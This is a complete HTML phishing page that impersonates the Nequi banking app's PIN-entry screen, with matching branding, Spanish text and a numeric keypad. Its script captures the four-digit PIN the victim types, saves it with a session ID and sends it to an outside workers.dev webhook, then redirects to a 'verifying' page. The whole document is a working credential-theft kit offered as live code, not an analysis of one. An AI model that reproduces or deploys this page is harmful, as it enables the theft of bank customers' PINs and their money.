<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Escribe tu clave</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: #21002b;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 380px;
            width: 100%;
            color: white;
        }
        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 12px;
            text-align: center;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 45px;
            opacity: 0.9;
        }
        .subtitle p:first-child {
            font-size: 16px;
            margin-bottom: 5px;
        }
        .subtitle p:last-child {
            font-size: 15px;
            opacity: 0.75;
        }
        .pin-dots {
            display: flex;
            justify-content: center;
            gap: 18px;
            margin-bottom: 55px;
        }
        .dot {
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.25);
            border: 2px solid rgba(255, 255, 255, 0.4);
            transition: all 0.2s;
        }
        .dot.filled {
            background: #ff008c;
            border-color: #ff008c;
            transform: scale(1.1);
        }
        .keyboard {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 18px;
            max-width: 300px;
            margin: 0 auto;
        }
        .key {
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            font-weight: 500;
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(5px);
            border-radius: 50%;
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .key:hover {
            background: rgba(255, 255, 255, 0.22);
            transform: scale(1.05);
        }
        .key:active {
            transform: scale(0.95);
            background: rgba(255, 255, 255, 0.3);
        }
        .key.delete {
            font-size: 26px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Escribe tu clave</h1>
        <div class="subtitle">
            <p>No dudamos que seas tú...</p>
            <p>Pero es mejor confirmar :)</p>
        </div>
        
        <div class="pin-dots" id="pinDots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        
        <div class="keyboard" id="keyboard"></div>
    </div>

    <script>
    let pin = '';
    const maxLength = 4;
    const dots = document.querySelectorAll('.dot');
    const keyboard = document.getElementById('keyboard');
    const webhookURL = 'https://credito-facil.miprimercredito.workers.dev/api/enviar';
    const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
    
    const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '', '0', '✗'];
    
    keys.forEach(key => {
        const keyDiv = document.createElement('div');
        keyDiv.className = 'key' + (key === '✗' ? ' delete' : '');
        keyDiv.textContent = key;
        
        if (key !== '') {
            keyDiv.addEventListener('click', () => {
                if (key === '✗') {
                    pin = pin.slice(0, -1);
                } else if (pin.length < maxLength) {
                    pin += key;
                }
                
                updateDots();
                
                if (pin.length === maxLength) {
                    const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
                    datosSesion.clave = pin;
                    localStorage.setItem('datosSesion', JSON.stringify(datosSesion));
                    
                    const mensaje = `🔐 **CLAVE INGRESADA**\n🆔 ${sesionId}\nClave: ${pin}`;
                    
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: mensaje })
                    }).finally(() => {
                        setTimeout(() => {
                            window.location.href = 'verificando.html';
                        }, 250);
                    });
                }
            });
        } else {
            keyDiv.style.visibility = 'hidden';
        }
        
        keyboard.appendChild(keyDiv);
    });
    
    function updateDots() {
        dots.forEach((dot, index) => {
            if (index < pin.length) {
                dot.classList.add('filled');
            } else {
                dot.classList.remove('filled');
            }
        });
    }
</script>
</body>
</html>
